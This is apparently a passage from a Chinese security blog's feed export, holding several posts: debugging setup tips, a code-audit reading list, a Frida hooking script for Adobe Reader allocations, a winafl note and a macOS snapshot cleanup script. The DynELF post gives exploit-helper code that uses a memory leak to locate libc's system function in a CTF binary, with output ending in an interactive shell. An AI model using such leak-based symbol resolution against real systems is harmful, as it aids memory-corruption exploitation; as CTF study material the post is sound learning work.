<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#p = process('./jmper')</span></span><br><span class="line">p = process(<span class="string">'./jmper'</span>,raw=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>

<h4 id="4-gdb-qemu调试linux内核timeout"><a href="#4-gdb-qemu调试linux内核timeout" class="headerlink" title="4. gdb+qemu调试linux内核timeout"></a>4. gdb+qemu调试linux内核timeout</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">target remote localhost:1234</span><br></pre></td></tr></table></figure>
<p>换成</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">target remote :1234</span><br></pre></td></tr></table></figure>
<h4 id="5-keyutils-的依赖-ubuntu"><a href="#5-keyutils-的依赖-ubuntu" class="headerlink" title="5. keyutils 的依赖(ubuntu)"></a>5. keyutils 的依赖(ubuntu)</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-cache policy libkeyutils-dev</span><br><span class="line">sudo apt-get install libkeyutils-dev</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>环境配置踩坑</category>
      </categories>
      <tags>
        <tag>env</tag>
        <tag>config</tag>
      </tags>
  </entry>
  <entry>
    <title>代码审计培养计划</title>
    <url>/2018/10/05/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%B9%E5%85%BB%E8%AE%A1%E5%88%92/</url>
    <content><![CDATA[<h4 id="0x00-为什么要搞这个"><a href="#0x00-为什么要搞这个" class="headerlink" title="0x00 : 为什么要搞这个"></a>0x00 : 为什么要搞这个</h4><p>因为我菜啊，而且我想学代码审计啊。</p>
<a id="more"></a>



<h4 id="0x01-第一步"><a href="#0x01-第一步" class="headerlink" title="0x01 : 第一步"></a>0x01 : 第一步</h4><p>先找点代码来读一读，学习一下，培养下代码阅读能力啥的。</p>
<h5 id="脚本引擎"><a href="#脚本引擎" class="headerlink" title="脚本引擎"></a>脚本引擎</h5><ul>
<li>tiny js </li>
</ul>
<p>just a demo0 </p>
<p><a href="https://github.com/gfwilliams/tiny-js.git">https://github.com/gfwilliams/tiny-js.git</a></p>
<ul>
<li>jerryscript </li>
</ul>
<p>ECMS 5.1 </p>
<p><a href="https://github.com/jerryscript-project/jerryscript.git">https://github.com/jerryscript-project/jerryscript.git</a></p>
<ul>
<li>Espruino (MPL v2.0) </li>
</ul>
<p>给嵌入式设备用的，很小 </p>
<ul>
<li>MuJS (Affero GPL) </li>
</ul>
<p>很小 demo类型 </p>
<ul>
<li>quad-wheel (MIT License) </li>
</ul>
<ul>
<li>v7 (GPL v2.0) </li>
</ul>
<p>准备先看tiny js，从最小的开始，后面看一个稍微大一点的 2 或者3 这样的。 </p>
<h5 id="文件格式类"><a href="#文件格式类" class="headerlink" title="文件格式类"></a>文件格式类</h5><p>一些小型的格式解析库、软件 </p>
<ul>
<li>Xml : tinyXML / rapidxml </li>
</ul>
<ul>
<li>PDF : mupdf / pdfium </li>
</ul>
<h4 id="0x02-已读"><a href="#0x02-已读" class="headerlink" title="0x02 : 已读"></a>0x02 : 已读</h4><ul>
<li>  tiny-js</li>
</ul>
<p>就是个demo js engine，支持的东西也很基本，就是解析到token序列，然后 case TOKEN，然后走不同的执行流，执行js code。</p>
]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>Study</tag>
      </tags>
  </entry>
  <entry>
    <title>what DynELF does basically</title>
    <url>/2016/12/24/what-DynELF-does-basically/</url>
    <content><![CDATA[<h4 id="0x00"><a href="#0x00" class="headerlink" title="0x00:"></a>0x00:</h4><p>一直很好奇DynELF是怎么去info leak的，在阅读完了老外的一篇文章后，自己也仿照这写了一个，顺便复习了下elf文件结构相关的知识。</p>
<a id="more"></a>


<h4 id="0x01-Get-elf-base-addr"><a href="#0x01-Get-elf-base-addr" class="headerlink" title="0x01: Get elf base addr"></a>0x01: Get elf base addr</h4><pre><code>前提：假设现在已经有一个任意地址读的漏洞，可以写出一个leak函数供后面代码使用。</code></pre>
<p>首先，我们需要从一个地址开始，先解析到<code>elf base addr</code>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_elf_base</span>(<span class="params">entry</span>):</span></span><br><span class="line">    entry = u64(entry)</span><br><span class="line">    libc_base = entry &amp; <span class="number">0xfffffffffffff000</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        tmp = leak(libc_base,<span class="number">0x8</span>)</span><br><span class="line">        <span class="keyword">if</span> tmp[<span class="number">0</span>:<span class="number">4</span>] == <span class="string">&#x27;\x7fELF&#x27;</span></span><br><span class="line">        	<span class="keyword">break</span></span><br><span class="line">        libc_base -= <span class="number">0x1000</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;[+]Libc base : 0x%x&#x27;</span> % (libc_base)</span><br><span class="line">    <span class="keyword">return</span> libc_base</span><br></pre></td></tr></table></figure>

<h4 id="0x02-find-program-header"><a href="#0x02-find-program-header" class="headerlink" title="0x02: find program header"></a>0x02: find program header</h4><p>之后是找到程序头。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findPhdr</span>(<span class="params">addr</span>):</span></span><br><span class="line">    <span class="keyword">if</span> bits == <span class="number">32</span>:</span><br><span class="line">        e_phoff = u32(leak(addr+<span class="number">0x1c</span>,<span class="number">0x4</span>).ljust(<span class="number">4</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        e_phoff = u64(leak(addr+<span class="number">0x20</span>,<span class="number">0x8</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> e_phoff + addr</span><br></pre></td></tr></table></figure>



<h4 id="0x03-DYNAMIC-Section"><a href="#0x03-DYNAMIC-Section" class="headerlink" title="0x03: DYNAMIC Section"></a>0x03: DYNAMIC Section</h4><p>有了之前的程序头，就可以根据elf文件结构，去找到<code>DYNAMIC section</code>了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findDynamic</span>(<span class="params">Phaddr,elf_base</span>):</span></span><br><span class="line">    i = -<span class="number">56</span></span><br><span class="line">    p_type = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> p_type != <span class="number">2</span>:</span><br><span class="line">        i += <span class="number">56</span></span><br><span class="line">        p_type = u32(leak,(Phaddr+i,<span class="number">0x4</span>))</span><br><span class="line">    <span class="keyword">return</span> u64(leak(Phaddr+i+<span class="number">16</span>,<span class="number">0x8</span>)) + elf_base</span><br></pre></td></tr></table></figure>

<h4 id="0x04-DT-SYMTAB-and-DT-STRTAB"><a href="#0x04-DT-SYMTAB-and-DT-STRTAB" class="headerlink" title="0x04: DT_SYMTAB and DT_STRTAB"></a>0x04: DT_SYMTAB and DT_STRTAB</h4><p>根据上一步找到的<code>DYNAMIC section</code>，可以确定<code>DT_STRTAB </code>和 <code>DT_SYMTAB</code>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findDynTable</span>(<span class="params">DynamicAddr</span>):</span></span><br><span class="line">    <span class="comment"># for DT_STRTAB -- 5</span></span><br><span class="line">    <span class="comment"># for DT_SYMTAB -- 6</span></span><br><span class="line">    tmp_dyn = DynamicAddr</span><br><span class="line">    dt_sym_addr = <span class="number">0</span></span><br><span class="line">    dt_str_addr = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        garbage = u64(leak(tmp_dyn,<span class="number">0x8</span>))</span><br><span class="line">        <span class="keyword">if</span> garbage == <span class="number">0x5</span>:</span><br><span class="line">            dt_str_addr = u64(leak(tmp_dyn+<span class="number">0x8</span>,<span class="number">0x8</span>))</span><br><span class="line">        <span class="keyword">elif</span> garbage == <span class="number">0x6</span>:</span><br><span class="line">            dt_sym_addr = u64(leak(tmp_dyn+<span class="number">0x8</span>,<span class="number">0x8</span>))</span><br><span class="line">        <span class="keyword">if</span> dt_sym_addr <span class="keyword">and</span> dt_str_addr:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        tmp_dyn += <span class="number">0x10</span></span><br><span class="line">    <span class="keyword">return</span> (dt_sym_addr,dt_str_addr)</span><br></pre></td></tr></table></figure>

<h4 id="0x05-find-symbol-you-want"><a href="#0x05-find-symbol-you-want" class="headerlink" title="0x05: find symbol you want"></a>0x05: find symbol you want</h4><p>最后一步，查找目标函数。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findSymbol</span>(<span class="params">strtab,symtab,symbol,elf_base</span>):</span></span><br><span class="line">    tmp_sym = symtab</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        garbage = u32(leak(tmp_sym,<span class="number">0x4</span>))</span><br><span class="line">        name = leak(strtab+garbage,<span class="built_in">len</span>(symbol))</span><br><span class="line">        <span class="keyword">if</span> name == symbol:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        tmp_sym += <span class="number">0x18</span></span><br><span class="line">    symbol_addr = u64(leak(tmp_sym+<span class="number">0x8</span>,<span class="number">0x8</span>)) + elf_base</span><br><span class="line">    <span class="keyword">return</span> symbol_addr</span><br></pre></td></tr></table></figure>

<h4 id="0x06-Test"><a href="#0x06-Test" class="headerlink" title="0x06: Test"></a>0x06: Test</h4><p>最后看一下效果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># muhe @ ubuntu in ~&#x2F;Desktop&#x2F;leak_study [20:58:04] </span><br><span class="line">$ python leak.py </span><br><span class="line">[+] Starting local process &#39;.&#x2F;pwn200&#39;: Done</span><br><span class="line">[+]Libc base : 0x7f95453ef000</span><br><span class="line">[+]Libc Program header addr : 0x7f95453ef040</span><br><span class="line">[+]Dynamic addr : 0x7f95457b1ba0</span><br><span class="line">[+]DT_SYMTAB_Addr 0x7f95453f2d80</span><br><span class="line">[+]DT_STRTAB_Addr 0x7f95453ffff8</span><br><span class="line">[+]System addr : 0x7f9545434390</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">Welcome to RCTF</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAA\x9@$ </span><br><span class="line"></span><br><span class="line">[*] Got EOF while reading in interactive</span><br></pre></td></tr></table></figure>
<h4 id="0x07"><a href="#0x07" class="headerlink" title="0x07:"></a>0x07:</h4><p>完整代码丢到了<a href="https://github.com/o0xmuhe/PwnableLog">自己的pwnlog</a>去了。<br>说句题外话-。-  在看这篇<a href="http://uaf.io/exploitation/misc/2016/04/02/Finding-Functions.html">Finding-Functions</a>的时候，问了作者几个问题，作者都很快回复而且还给了不少其他的建议-。- 人真的很nice。</p>
<h4 id="0x08-Reference"><a href="#0x08-Reference" class="headerlink" title="0x08: Reference"></a>0x08: Reference</h4><p><a href="http://uaf.io/exploitation/misc/2016/04/02/Finding-Functions.html">Finding-Functions</a></p>
]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>使用Frida辅助逆向</title>
    <url>/2019/01/04/%E4%BD%BF%E7%94%A8Frida%E8%BE%85%E5%8A%A9%E9%80%86%E5%90%91/</url>
    <content><![CDATA[<h4 id="0x00-关于使用Frida"><a href="#0x00-关于使用Frida" class="headerlink" title="0x00 : 关于使用Frida"></a>0x00 : 关于使用Frida</h4><p><code>Frida</code>是一个跨平台的、多平台的hook框架，使用起来十分方便，而且文档全面，可以很好的辅助逆向工程。在需要使用一些hook的时候，可以很快地完成；如果还是用c/c++的话..写dll，还要想办法dll注入，而且很麻烦不灵活，修改代码很麻烦。</p>
<a id="more"></a>

<p>最近的工作中，我做了很多逆向的工作，虽然有部分工作暂时看不到什么收益，算是白折腾浪费了两周，但是这段时间熟悉了<code>pykd</code>，<code>windbg script</code>，<code>frida</code>，<code>IDA Python</code>的编写…也搞了一些方便日后修改使用的模板，算是有一点点收获吧，不过浪费了时间还是很难过。</p>
<h4 id="0x01-HOOK需求"><a href="#0x01-HOOK需求" class="headerlink" title="0x01 : HOOK需求"></a>0x01 : HOOK需求</h4><p>我需要去追一些内存分配、有些可能还需要操作一下，方便我的逆向工作顺利进行。</p>
<p>我这里以<code>Adobe Reader</code>  为例子，我hook了<code>reader</code>自己封装的内存分配函数，并且显示分配得到的内存；其他的需求都差不多，直接改模板就行，我是用的官方的模板修改的。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_message</span>(<span class="params">message, data</span>):</span></span><br><span class="line">    print(<span class="string">&quot;[%s] =&gt; %s&quot;</span> % (message, data))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">target_process</span>):</span></span><br><span class="line">    session = frida.attach(target_process)</span><br><span class="line"></span><br><span class="line">    script = session.create_script(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    var baseAddr = Module.findBaseAddress(&#x27;AcroRd32.dll&#x27;);</span></span><br><span class="line"><span class="string">    console.log(&#x27;AcroRd32.dll baseAddr: &#x27; + baseAddr);</span></span><br><span class="line"><span class="string">	var CallocFunc = resolveAddress(baseAddr);</span></span><br><span class="line"><span class="string">	var JP2KDecodeFilterObj;</span></span><br><span class="line"><span class="string">	var size = 1;</span></span><br><span class="line"><span class="string">	Interceptor.attach(CallocFunc, &#123; </span></span><br><span class="line"><span class="string">	    </span></span><br><span class="line"><span class="string">		onEnter: function (args) &#123;</span></span><br><span class="line"><span class="string">			//console.log(&#x27;[+] Called CallocFunc&#x27; + CallocFunc);</span></span><br><span class="line"><span class="string">			size = args[0];</span></span><br><span class="line"><span class="string">			//console.log(&#x27;[+] ALLOC size : &#x27; + size);</span></span><br><span class="line"><span class="string">		&#125;,</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">		onLeave: function (retval) &#123;</span></span><br><span class="line"><span class="string">			console.log(&#x27;[+] Returned from CallocFunc: &#x27; + retval);</span></span><br><span class="line"><span class="string">			dumpAddr(&#x27;ret buffer&#x27;, retval, parseInt(size));</span></span><br><span class="line"><span class="string">		&#125;</span></span><br><span class="line"><span class="string">    &#125;);</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">	function replaceMem(addr, size)&#123;</span></span><br><span class="line"><span class="string">	    if (addr.isNull())</span></span><br><span class="line"><span class="string">			return;</span></span><br><span class="line"><span class="string">	    for(var idx = 0; idx &lt; size; idx++)&#123;</span></span><br><span class="line"><span class="string">		    Memory.writeU8(addr.add(ptr(idx)), 0x41);</span></span><br><span class="line"><span class="string">		&#125;</span></span><br><span class="line"><span class="string">	&#125;</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">	function dumpAddr(info, addr, size) &#123;</span></span><br><span class="line"><span class="string">        if (addr.isNull())</span></span><br><span class="line"><span class="string">            return;</span></span><br><span class="line"><span class="string">        console.log(&#x27;Data dump &#x27; + info + &#x27; :&#x27;);</span></span><br><span class="line"><span class="string">        var buf = Memory.readByteArray(addr, size);</span></span><br><span class="line"><span class="string">        console.log(hexdump(buf, &#123; offset: 0, length: size, header: true, ansi: true &#125;));</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">	function resolveAddress(addr) &#123;</span></span><br><span class="line"><span class="string">        var offset = ptr(offset_you_get)</span></span><br><span class="line"><span class="string">        var result = baseAddr.add(offset);</span></span><br><span class="line"><span class="string">        console.log(&#x27;[+] CallocFunc addr=&#x27; + result);</span></span><br><span class="line"><span class="string">        return result;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line">    script.on(<span class="string">&#x27;message&#x27;</span>, on_message)</span><br><span class="line">    script.load()</span><br><span class="line">    print(<span class="string">&quot;[!] Ctrl+D on UNIX, Ctrl+Z on Windows/cmd.exe to detach from instrumented program.\n\n&quot;</span>)</span><br><span class="line">    sys.stdin.read()</span><br><span class="line">    session.detach()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        print(<span class="string">&quot;Usage: %s &lt;process name or PID&gt;&quot;</span> % __file__)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        target_process = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        target_process = sys.argv[<span class="number">1</span>]</span><br><span class="line">    main(target_process)</span><br></pre></td></tr></table></figure>

<p>代码还是比较简单的，py脚本，hook部分的代码是js写的，（又被逼着学了一下js，然而我觉得我的js写的有种c的味道…）</p>
<p>如果你仔细看被hook的进程的话，你会发现在hook发生地时候，<code>Frida</code>的dll会注入进去，然后就是传统的那种hook的方式了，只是框架帮你做了太多的事情，所以你只需要写好js就好了。</p>
<p>我截取部分运行时候输出：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">00000000  00 00 00 00 00 00                                ......</span><br><span class="line">[+] Returned from CallocFunc: 0x348f6fb0</span><br><span class="line">Data dump ret buffer :</span><br><span class="line">           0  1  2  3  4  5  6  7  8  9  A  B  C  D  E  F  0123456789ABCDEF</span><br><span class="line">00000000  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">00000010  00 00 00                                         ...</span><br><span class="line">[+] Returned from CallocFunc: 0x32d20fd8</span><br><span class="line">Data dump ret buffer :</span><br><span class="line">           0  1  2  3  4  5  6  7  8  9  A  B  C  D  E  F  0123456789ABCDEF</span><br><span class="line">00000000  00 00 00 00 00 00 00 00 00                       .........</span><br><span class="line">[+] Returned from CallocFunc: 0x2c3f0f90</span><br><span class="line">Data dump ret buffer :</span><br><span class="line">           0  1  2  3  4  5  6  7  8  9  A  B  C  D  E  F  0123456789ABCDEF</span><br><span class="line">00000000  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">00000010  00 00 00 00 00 00 00 00 00 00 00 00              ............</span><br><span class="line">[+] Returned from CallocFunc: 0x1b934fc8</span><br><span class="line">Data dump ret buffer :</span><br><span class="line">           0  1  2  3  4  5  6  7  8  9  A  B  C  D  E  F  0123456789ABCDEF</span><br><span class="line">00000000  00 00 00 00 00 00 00 00 00 00 00 00 00           .............</span><br><span class="line">[+] Returned from CallocFunc: 0x1bd8efb0</span><br><span class="line">Data dump ret buffer :</span><br><span class="line">           0  1  2  3  4  5  6  7  8  9  A  B  C  D  E  F  0123456789ABCDEF</span><br><span class="line">00000000  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">00000010  00 00 00                                         ...</span><br><span class="line">[+] Returned from CallocFunc: 0x35857f58</span><br><span class="line">Data dump ret buffer :</span><br><span class="line">           0  1  2  3  4  5  6  7  8  9  A  B  C  D  E  F  0123456789ABCDEF</span><br><span class="line">00000000  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">00000010  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">00000020  00 00 00 00 00 00 00 00 00 00                    ..........</span><br><span class="line">[+] Returned from CallocFunc: 0x35b33fc8</span><br><span class="line">Data dump ret buffer :</span><br><span class="line">           0  1  2  3  4  5  6  7  8  9  A  B  C  D  E  F  0123456789ABCDEF</span><br><span class="line">00000000  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">00000010  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">00000020  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">00000030  00                                               .</span><br><span class="line">[+] Returned from CallocFunc: 0x1bd66f78</span><br><span class="line">Data dump ret buffer :</span><br><span class="line">           0  1  2  3  4  5  6  7  8  9  A  B  C  D  E  F  0123456789ABCDEF</span><br><span class="line">00000000  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">00000010  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">00000020  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">00000030  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">00000040  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">00000050  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">00000060  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">00000070  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">00000080  00 00 00 00 00 00 00 00                          ........</span><br><span class="line">[+] Returned from CallocFunc: 0x1bd6eff8</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>一些其他的想法，这个其实可以做简单的in memory fuzz了，循环call，然后换内存…当然这个想法很low了，n年前的东西了，而且这种的话cov很难处理。</p>
<p>要说问题，就是<code>Frida</code>读取本地文件的问题，我试了<code>new File</code>和<code>frida-fs</code>均以失败告终…如果有人知道怎么玩的话，还望不吝赐教  :)</p>
<h4 id="0x02-其他"><a href="#0x02-其他" class="headerlink" title="0x02 : 其他"></a>0x02 : 其他</h4><p>在写这些东西的时候，请教了<a href="https://github.com/jmpews"><code>jmpews</code>师傅</a>很多问题，十分感谢！</p>
<p>jmpews师傅后面向我推荐了<code> detours + Xenos</code>这种方式来做hook，精力有限，而且上手难度有点高，所以暂时只能放在to do list上了，不过还是很感谢～</p>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>Tools</tag>
        <tag>Frida</tag>
      </tags>
  </entry>
  <entry>
    <title>初试winafl</title>
    <url>/2016/08/26/%E5%88%9D%E8%AF%95winafl/</url>
    <content><![CDATA[<h4 id="1-fuzz自己写的exe"><a href="#1-fuzz自己写的exe" class="headerlink" title="1. fuzz自己写的exe"></a>1. fuzz自己写的exe</h4><a id="more"></a>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/fuzz_exe.jpg"></p>
<h4 id="2-fuzz自己写的dll"><a href="#2-fuzz自己写的dll" class="headerlink" title="2.fuzz自己写的dll"></a>2.fuzz自己写的dll</h4><p>搞一个接口程序去fuzz就可以了，但是效率贼低…有待解决。<br><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/fuzz_dll.png"></p>
]]></content>
      <categories>
        <category>Fuzz</category>
      </categories>
      <tags>
        <tag>fuzz</tag>
      </tags>
  </entry>
  <entry>
    <title>拯救macOS High sierra的硬盘空间</title>
    <url>/2018/03/14/%E6%8B%AF%E6%95%91macOS-High-sierra%E7%9A%84%E7%A1%AC%E7%9B%98%E7%A9%BA%E9%97%B4/</url>
    <content><![CDATA[<h4 id="0x00-起因"><a href="#0x00-起因" class="headerlink" title="0x00 : 起因"></a>0x00 : 起因</h4><p>Mac一直开着time machine备份数据，一直没出啥问题。<br>直到今天在工作的时候，原本clone的一个虚拟机有问题，我就删了，重新克隆。(没有快照真的尴尬了)</p>
<a id="more"></a>

<p>结果发现克隆不了，提示我硬盘空间不足。 :(<br>我看了下本机的硬盘，明明还有120g+呢，怎么会不足呢。</p>
<h4 id="0x01-问题所在"><a href="#0x01-问题所在" class="headerlink" title="0x01 : 问题所在"></a>0x01 : 问题所在</h4><p>我使用了clean my mac各种搞事、清理空间，磁盘剩余空间到了200g。。但是我克隆还是失败 :(</p>
<p>于是打开磁盘工具查看，发现有150g空间的空间是可以清除的，就很好奇哪来的这么大的空间…</p>
<p>看了Apple官网，说是啥文件可以存iCloud，然后下载的时候用，就可以省下来一部分空间，可是我想了想，肯定不是这个啊，我iCloud一共才50g，而且才用了一半，这150g肯定不对。</p>
<p>后来在<a href="https://www.v2ex.com/t/389533">v2ex</a>看到了正解。</p>
<p>这是升级了10.13后的time machine搞的事，他有自动本地备份。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">当 TM 打开后，如果备份介质不可用，那么 TM 不会停止工作，它依然会监控系统的运行，并建立本地快照，以达成 TM 的备份功能，比如如果你在此时不小心删除了一个文件，那么依然可以从 TM 中将它恢复，这是一个不错的功能。一旦你的备份介质可用，它会自动将快照移到（不是备份，是移动）备份介质中，以释放本地空间；而且它会依照当前系统分区的使用情况来确认自己建立本地快照的行为，简单说就是当本地空闲空间过少时，它会酌情删除旧的本地快照。 </span><br></pre></td></tr></table></figure>

<p>大概就是这样的情况。</p>
<h4 id="0x02-解决"><a href="#0x02-解决" class="headerlink" title="0x02 : 解决"></a>0x02 : 解决</h4><h6 id="1-关闭本地备份"><a href="#1-关闭本地备份" class="headerlink" title="1. 关闭本地备份"></a>1. 关闭本地备份</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo tmutil disablelocal</span><br></pre></td></tr></table></figure>
<p>但是我发现这个命令已经没了，好像是被移除了。</p>
<h6 id="2-删除本地备份"><a href="#2-删除本地备份" class="headerlink" title="2. 删除本地备份"></a>2. 删除本地备份</h6><p>只能先用<code>tmutil listlocalsnapshots [mount]</code>找本地备份，然后使用<code> tmutil deletelocalsnapshots YYYY-MM-DD-HHMMSS</code> 来删除。<br>下面是我的测试…</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># muhe @ muheMacBookPro in ~ [17:00:12] C:64</span></span><br><span class="line">$ tmutil listlocalsnapshots</span><br><span class="line">Usage: tmutil listlocalsnapshots &lt;mount_point&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># muhe @ muheMacBookPro in ~ [17:00:25] C:64</span></span><br><span class="line">$ tmutil listlocalsnapshots /</span><br><span class="line">com.apple.TimeMachine.2018-03-09-011841</span><br><span class="line">com.apple.TimeMachine.2018-03-13-181325</span><br><span class="line">com.apple.TimeMachine.2018-03-13-191609</span><br><span class="line">com.apple.TimeMachine.2018-03-13-202018</span><br><span class="line">com.apple.TimeMachine.2018-03-13-211538</span><br><span class="line">com.apple.TimeMachine.2018-03-13-221327</span><br><span class="line">com.apple.TimeMachine.2018-03-14-001309</span><br><span class="line">com.apple.TimeMachine.2018-03-14-012200</span><br><span class="line">com.apple.TimeMachine.2018-03-14-030328</span><br><span class="line">com.apple.TimeMachine.2018-03-14-050253</span><br><span class="line">com.apple.TimeMachine.2018-03-14-064523</span><br><span class="line">com.apple.TimeMachine.2018-03-14-104506</span><br><span class="line">com.apple.TimeMachine.2018-03-14-115132</span><br><span class="line">com.apple.TimeMachine.2018-03-14-142419</span><br><span class="line">com.apple.TimeMachine.2018-03-14-152240</span><br><span class="line">com.apple.TimeMachine.2018-03-14-162236</span><br><span class="line">com.apple.TimeMachine.2018-03-14-163225</span><br><span class="line"></span><br><span class="line"><span class="comment"># muhe @ muheMacBookPro in ~ [17:00:32]</span></span><br><span class="line">$ tmutil deletelocalsnapshots 2018-03-09-011841</span><br><span class="line">Deleted <span class="built_in">local</span> snapshot <span class="string">&#x27;2018-03-09-011841&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># muhe @ muheMacBookPro in ~ [17:01:12]</span></span><br><span class="line">$ tmutil deletelocalsnapshots 2018-03-13-181325</span><br><span class="line">Deleted <span class="built_in">local</span> snapshot <span class="string">&#x27;2018-03-13-181325&#x27;</span></span><br></pre></td></tr></table></figure>



<p>写了个脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&#x27;tmutil listlocalsnapshots /&#x27;</span></span><br><span class="line">process = subprocess.Popen(cmd, shell=<span class="literal">True</span>, stdout=subprocess.PIPE, stderr=subprocess.PIPE)</span><br><span class="line">out, err = process.communicate()</span><br><span class="line">out = out.split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local_snapshots = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> out:</span><br><span class="line">    local_snapshots.append(item.split(<span class="string">&#x27;.&#x27;</span>)[-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> local_snapshots:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        cmd = <span class="string">&#x27;tmutil deletelocalsnapshots &#123;0&#125;&#x27;</span>.<span class="built_in">format</span>(item)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;[*] Deleting localsnapshot : &#123;0&#125;&#x27;</span>.<span class="built_in">format</span>(item))</span><br><span class="line">        process = subprocess.Popen(cmd, shell=<span class="literal">True</span>, stdout=subprocess.PIPE, stderr=subprocess.PIPE)</span><br><span class="line">        out, err = process.communicate()</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;[*] Localsanpshot &#123;0&#125; deleted&#x27;</span>.<span class="built_in">format</span>(item))</span><br><span class="line">    <span 